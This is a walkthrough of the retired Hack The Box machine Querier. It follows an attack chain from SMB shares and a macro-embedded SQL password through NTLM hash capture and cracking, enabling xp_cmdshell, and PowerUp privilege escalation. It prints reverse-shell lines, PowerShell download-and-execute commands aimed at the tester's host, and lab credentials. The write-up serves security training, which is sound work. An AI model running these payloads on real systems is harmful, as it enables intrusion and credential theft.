---
machine: Querier
platform: Hack The Box
category: Windows
os: Windows
difficulty: Medium
points: 30
tags: [xlsm-macro, mssql, responder-ntlm, xp-cmdshell, powerup-gpp]
date: 2026-03-30
status: retired
summary: "A medium Windows box built around a Microsoft SQL Server instance — exercising SMB share enumeration, secrets hidden in an Office macro, MSSQL client interaction, NTLM hash capture and offline cracking, and a Windows privilege-escalation audit with PowerUp. A well-rounded tour of MSSQL attack paths and Windows credential hygiene failures."
---
## Enumeration

nmap scan:
```bash
└─$ nmap -sCV -p- -oN nmapscan 10.129.32.15    
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-12 16:24 -0400
Nmap scan report for 10.129.32.15
Host is up (0.036s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.32.15:1433: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: QUERIER
|     DNS_Domain_Name: HTB.LOCAL
|     DNS_Computer_Name: QUERIER.HTB.LOCAL                                                                                                   
|     DNS_Tree_Name: HTB.LOCAL                                                                                                               
|_    Product_Version: 10.0.17763                                                                                                            
|_ssl-date: 2026-05-12T20:26:49+00:00; +2s from scanner time.                                                                                
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback                                                                                     
| Not valid before: 2026-05-12T20:22:18                                                                                                      
|_Not valid after:  2056-05-12T20:22:18                                                                                                      
| ms-sql-info:                                                                                                                               
|   10.129.32.15:1433:                                                                                                                       
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2s, deviation: 0s, median: 1s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-05-12T20:26:42
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 143.94 seconds
```

Domain: `HTB.LOCAL`
FQDN: `QUERIER.HTB.LOCAL`

Checked anonymous and guest smb access, nothing.
We can anonymously connect with rpcclient but there doesn't seem to be much we can do besides `srvinfo`

After further inspection it seems that null auth on SMB is actually allowed but my anonymous logon attempts with `nxc` and `smbmap` failed.  For some reason though Null sessions with `smbclient` can list the shares before failing (due to legacy protocol according to the internet).

View shares using `smbclient -N -L \\\\10.129.32.15` to list shares and then find the unusual `Reports` share which you can connect to with smbclient `smbclient -N \\\\10.129.32.15\\Reports`

We get a file called `Currency Volume Report.xlsm`

This doesn't have any contents when viewing it but after we run exiftool, we see it has Macro's enabled and is made by author `Luis` 

After extracting the macro from the `.xlsm` with ` unzip -j 'Currency Volume Report.xlsm' xl/vbaProject.bin` you find a variety of SQL server SQL commands in the macro along with the password defined a couple times in plaintext: `PcwTWTHRwryjc$c6` along with a uid of `reporting`

## Foothold

We can attempt to connect using Impacket's `mssqlclient.py` tool (I got stuck here because using flag `-windows-auth` is required but I wasn't using it, so if mssqlclient fails to connect when you think it should I'd try with and without `-windows-auth)

```bash
┌──(kali㉿kali)-[~/htb/querier]
└─$ mssqlclient.py reporting@10.129.32.15 -windows-auth
/usr/local/bin/mssqlclient.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.14.0.dev0+20260420.123356.9afc09b9', 'mssqlclient.py')
Impacket v0.14.0.dev0+20260420.123356.9afc09b9 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2017 RTM (14.0.1000)
[!] Press help for extra shell commands

```

### MSSQL Enumeration
Upon gaining connection you can run some simple enumeration commands to gain a bearing of what things look like

```sql
-- Current user and role
SELECT SYSTEM_USER;
SELECT USER_NAME();

-- Are you a sysadmin? (1 = yes)
SELECT IS_SRVROLEMEMBER('sysadmin');

-- All your server roles
SELECT roles.name FROM sys.server_role_members
JOIN sys.server_principals roles ON roles.principal_id = server_role_members.role_principal_id
JOIN sys.server_principals logins ON logins.principal_id = server_role_members.member_principal_id
WHERE logins.name = SYSTEM_USER;

#### What Databases Exist?
SELECT name FROM master..sysdatabases;
-- or
SELECT name FROM sys.databases;

#### Explore said databases (use 'Use {databasename};' first)
-- List tables 
SELECT table_name FROM information_schema.tables;
-- Dump a table 
SELECT * FROM tablename;

#### Check if OS command execution is allowed
-- Check if xp_cmdshell is enabled
EXEC xp_cmdshell 'whoami';

-- If disabled, enable it (requires sysadmin)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

#### Check linked servers for lateral movement
-- Other SQL servers this one trusts
EXEC sp_linkedservers;
SELECT * FROM sys.servers;

-- Execute on a linked server
EXEC ('SELECT SYSTEM_USER') AT [linkedservername];
```

##### Quick workflow for MSSQL
```sql
SELECT name FROM sys.databases;   -- what exists
USE interesting_db;                -- switch to it
SELECT table_name FROM information_schema.tables WHERE table_type = 'BASE TABLE';  -- what tables
SELECT TOP 10 * FROM interesting_table;  -- peek at data
```

##### Common MSSQL Escalation Workflow:
```text
Connect to MSSQL
       ↓
IS_SRVROLEMEMBER('sysadmin') = 1?
    YES → xp_cmdshell → direct RCE, you're done
    NO  ↓
Can I enable xp_cmdshell? 
    NO  ↓
Do I have linked servers with higher privs?
    NO  ↓
Use xp_dirtree to capture service account hash
       ↓
Crack hash → new credentials
       ↓
Reconnect with new creds → check sysadmin again
```

#### xp_dirtree
xp_dirtree is a builtin in procedure in MSSQL to list directory contents of the servers filesystem like `dir` or `ls`, this is often exploitable because if you point it to list your controlled share (`\\yourip\share`) it will send an authentication to your share to gain authorization to read it.  This allows us to gather the NTLM or NTLMv2 auth via hosting a fake SMB endpoint using something like responder.

```sql
SQL (QUERIER\reporting  reporting@volume)> xp_dirtree \\10.10.15.144\donthackmeplz
subdirectory   depth   file   
------------   -----   ----   
```

```bash
──(kali㉿kali)-[~/htb/querier]
└─$ sudo responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|


[*] Tips jar:
    USDT -> 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A
    BTC  -> bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]
    DHCPv6                     [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.15.144]
    Responder IPv6             [fe80::1232:6d34:efa1:297a]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-LTIVA5TW3RS]
    Responder Domain Name      [WY9E.LOCAL]
    Responder DCE-RPC Port     [46890]

[*] Version: Responder 3.2.2.0
[*] Author: Laurent Gaffie, <lgaffie@secorizon.com>

[+] Listening for events...                                                                                                                                                                                        

[SMB] NTLMv2-SSP Client   : 10.129.32.15
[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:1b27284f236b1d03:5821889E9E10055EB0FF13426098973E:010100000000000000F615F9BBE2DC01273A7107BEA206CA0000000002000800570059003900450001001E00570049004E002D004C00540049005600410035005400570033005200530004003400570049004E002D004C0054004900560041003500540057003300520053002E0057005900390045002E004C004F00430041004C000300140057005900390045002E004C004F00430041004C000500140057005900390045002E004C004F00430041004C000700080000F615F9BBE2DC010600040002000000080030003000000000000000000000000030000035041222827B5979920EBCE31754E18F27870D64793AF20CE84FE0916DD55F9A0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E00310034003400000000000000000000000000                                                                                                           
```

I ran this NTLMv2 Hash against `rockyou.txt` and cracked it for the password `corporate568`

```bash
──(kali㉿kali)-[~/htb/querier]
└─$ hashcat -m 5600 mssqlhash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-Intel(R) Core(TM) Ultra 5 225U, 3116/6232 MB (1024 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (6152 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

MSSQL-SVC::QUERIER:1b27284f236b1d03:5821889e9e10055eb0ff13426098973e:010100000000000000f615f9bbe2dc01273a7107bea206ca0000000002000800570059003900450001001e00570049004e002d004c00540049005600410035005400570033005200530004003400570049004e002d004c0054004900560041003500540057003300520053002e0057005900390045002e004c004f00430041004c000300140057005900390045002e004c004f00430041004c000500140057005900390045002e004c004f00430041004c000700080000f615f9bbe2dc010600040002000000080030003000000000000000000000000030000035041222827b5979920ebce31754e18f27870d64793af20ce84fe0916dd55f9a0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310035002e00310034003400000000000000000000000000:corporate568
```

We try `MSSQL-SVC:corporate568` on winrm and smb and unsurprisingly the credpair fails

We can try to connect back again to MSSQL for a higher priv account:

```bash
──(kali㉿kali)-[~/htb/querier]
└─$ mssqlclient.py mssql-svc@10.129.32.15 -windows-auth
/usr/local/bin/mssqlclient.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.14.0.dev0+20260420.123356.9afc09b9', 'mssqlclient.py')
Impacket v0.14.0.dev0+20260420.123356.9afc09b9 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2017 RTM (14.0.1000)
[!] Press help for extra shell commands
SQL (QUERIER\mssql-svc  dbo@master)> 

```

We find now we are a sysadmin:
```sql
SQL (QUERIER\mssql-svc  dbo@master)> select is_srvrolemember('sysadmin');
    
-   
1   
```

As a sysadmin we want OS command execution:
```sql
SQL (QUERIER\mssql-svc  dbo@master)> EXEC xp_cmdshell 'whoami';
ERROR(QUERIER): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
```

We see that we cannot already execute commands via `EXEC xp_cmdshell` but that we can enable it by using `sp_configure`

##### Enabling OS command shell execution as admin with sp_configure
```sql
-- Enable it
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Test it
EXEC xp_cmdshell 'whoami';
```

```sql
SQL (QUERIER\mssql-svc  dbo@master)> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (QUERIER\mssql-svc  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (QUERIER\mssql-svc  dbo@master)> EXEC xp_cmdshell 'whoami';
output              
-----------------   
querier\mssql-svc   
NULL        
```
##### Elevating Shell to Reverse Shell Powershell from MSSQL xp_cmdshell
If you want a better shell you can download and execute a revshell from your `EXEC xp_cmdshell`
- Make a powershell revshell and host it with `python3 -m http.server 8080`
- setup your listener
```sql
-- Download and execute a reverse shell
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://yourip:8080/shell.ps1'')"';
```

We have a powershell revshell now:
```bash
┌──(kali㉿kali)-[~/htb/querier]
└─$ nc -lvnp 1337                              
listening on [any] 1337 ...
connect to [10.10.15.144] from (UNKNOWN) [10.129.32.15] 49680
whoami
querier\mssql-svc
```

We can navigate to the mssql-svc user and get the flag

## Privilege Escalation

#### Privilege Escalation with PowerSploit and PowerUp.ps1
Move `PowerUp.ps1` to the victim windows machine and load the functions into the session with:
`. .\PowerUp.ps1` and then run `Invoke-AllChecks`

We actually find that no output is given when we run `Invoke-AllChecks`, this is because of how output is handled with our reverse shell.  To mitigate this we can run `$results = Invoke-AllChecks; $results | Out-String` instead.

We have some strong results:
```powershell
$results = Invoke-AllChecks; $results | Out-String


Privilege   : SeImpersonatePrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 4180
ProcessId   : 108
Name        : 108
Check       : Process Token Privileges

ServiceName   : UsoSvc
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True
Name          : UsoSvc
Check         : Modifiable Services

ModifiablePath    : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
IdentityReference : QUERIER\mssql-svc
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

UnattendPath : C:\Windows\Panther\Unattend.xml
Name         : C:\Windows\Panther\Unattend.xml
Check        : Unattended Install Files

Changed   : {2019-01-28 23:12:48}
UserNames : {Administrator}
NewName   : [BLANK]
Passwords : {MyUnclesAreMarioAndLuigi!!1!}
File      : C:\ProgramData\Microsoft\Group 
            Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml
Check     : Cached GPP Files
```

Obviously you have plaintext credentials in Cached GPP Files and this is the simplest solution.  You could also abuse the `UsoSvc` process thats modifiable, SYSTEM privs, and restartable.  You can add the `-Command C:\Temp\nc.exe 10.10.15.144 4444 -e powershell.exe` to the service and `Invoke-ServiceAbuse` to add the arbitrary command execution and restart the binary to get a system shell.

```powershell
Invoke-ServiceAbuse -Name 'UsoSvc' -Command 'powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString(''http://10.10.15.144:8080/revpower2.ps1'')"'        
@{ServiceAbused=UsoSvc; Command=powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.15.144:8080/revpower2.ps1')"}                                                             
```

Either way, we can access the Administrator desktop and retrieve the flag.
